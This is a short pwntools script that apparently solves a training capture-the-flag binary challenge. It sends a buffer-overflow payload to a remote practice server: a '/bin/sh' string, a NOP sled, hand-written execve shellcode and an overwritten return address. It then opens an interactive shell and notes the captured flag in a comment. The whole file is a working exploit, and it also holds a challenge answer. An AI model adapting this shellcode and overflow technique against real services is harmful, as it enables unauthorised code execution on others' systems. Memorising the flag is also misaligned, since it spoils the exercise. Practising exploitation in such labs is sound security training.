from pwn import *
r = remote("bin.training.jinblack.it", 2001)

#assembly code to assemble:
#mov rdi, 0x601080
#mov rsi, 0x601088
#mov rdx, rsi
#mov rax, 0x3b
#syscall

shellcode = b"\x48\xC7\xC7\x80\x10\x60\x00\x48\xC7\xC6\x88\x10\x60\x00\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05"

#the return address is the global variable buffer in the nop sled
ret_address = b"\x90\x10\x60\x00\x00\x00\x00\x00"

#in the payload I have to shift a lot of positions, in order to place correctly the return address
payload = b"/bin/sh\x00" + b"\x00"*8 + b"\x90"*974 + shellcode + ret_address

r.send(payload)
r.interactive()

#flag{congratz_you_used_a_sh3llcode!}
